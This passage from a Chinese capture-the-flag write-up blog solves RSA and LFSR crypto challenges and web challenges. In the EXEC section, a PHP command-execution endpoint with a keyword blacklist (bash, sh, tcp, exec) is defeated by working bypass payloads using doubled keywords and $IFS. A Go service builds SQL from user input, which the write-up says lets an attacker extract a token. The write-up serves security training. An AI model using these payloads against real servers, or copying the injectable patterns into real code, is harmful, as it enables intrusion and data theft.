yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">m = rabin_decrypt(mm,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="BABY-RSA"><a href="#BABY-RSA" class="headerlink" title="BABY-RSA"></a>BABY-RSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">status,mask</span>):</span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">c = <span class="built_in">pow</span>(num, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(hp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">str</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= ...</span></span><br><span class="line"><span class="string">c= ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key:</span></span><br><span class="line"><span class="stringspan></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA $p$ 高位泄露攻击+LFSR。</p><p>先用LFSR结果异或还原 $p$ 高位 $hp$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">status,mask</span>):</span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#xx27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">hp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">hp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">int</span>(hp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(hp)</span><br><span class="line"><span class="comment"># 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br></pre></td></tr></table></figure><p>此时 $hp$ 有568位，根据Coppersmith定理，1024位的 $p$ 至少需要高576位才能恢复完整 $p$，需爆破8位二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">hp = <span class="number">484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.digits + <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        pp = <span class="built_in">hex</span>(hp) + a + b</span><br><span class="line">        <span class="comment">#p需要用0补全到1024位</span></span><br><span class="line">        pp += <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">        <span class="comment">#要加的数字与补全p时0的个数有关</span></span><br><span class="line">        pp = <span class="built_in">int</span>(pp, <span class="number">16</span>)</span><br><span class="line">        p_fake = pp+<span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">        pbits = <span class="number">1024</span></span><br><span class="line">        kbits = pbits-<span class="number">576</span></span><br><span class="line">        pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line">        <span class="comment">#print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))</span></span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        f = x + pbar</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">            <span class="built_in">print</span>(x0 + pbar)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span>        </span><br><span class="line"><span class="comment"># 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br></pre></td></tr></table></figure><p>最后常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">c = <span class="number">3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>查看源码，找到 <code>main.js</code>，发现 <code>ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==</code>，base64解码得flag。</p><p>​    </p><h3 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h3><p>提示robots协议，访问 <code>robots.txt</code>，发现存在 <code>fiag_ls_h3re.php</code>，</p><p>访问发现右键被禁用，加前缀 <code>view-source:</code> 查看源码得flag。</p><p>​    </p><h3 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;ob_start&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;getenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;error_log&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nl&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>带黑名单的无回显RCE，可以重定向写命令执行结果到文件，关键字可双写绕过，空格用<code>$IFS</code>绕过。</p><p>列目录：<code>?cmd=llss$IFS/&gt;1.txt</code>，得到根目录flag文件名 <code>ctf_is_fun_flag2021</code>；</p><p>读文件：<code>?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt</code>，得到flag。</p><p>​    </p><h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><p>源码里有python和go两个文件夹，有两个服务，端口8000是python开的，映射到对外端口；内网端口5000是go服务。python代码相当于中转站接受外网请求，处理后转发给go，go进行底层处理。</p><p>go服务中关键代码 <code>backend.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">Id  <span class="type">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Name <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Votes <span class="type">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">rows, err := db.Sqlite.Query(query)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret <span class="type">string</span></span><br><span class="line">row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="type">string</span>(data)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路由 <code>/flag</code> 中GET两个参数 <code>?action=readFlag&amp;token=xxxxx</code>，token正确得flag，而路由 <code>/search</code> 中容易通过SQL注入拿到token。</p><p>python服务中 <code>app.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 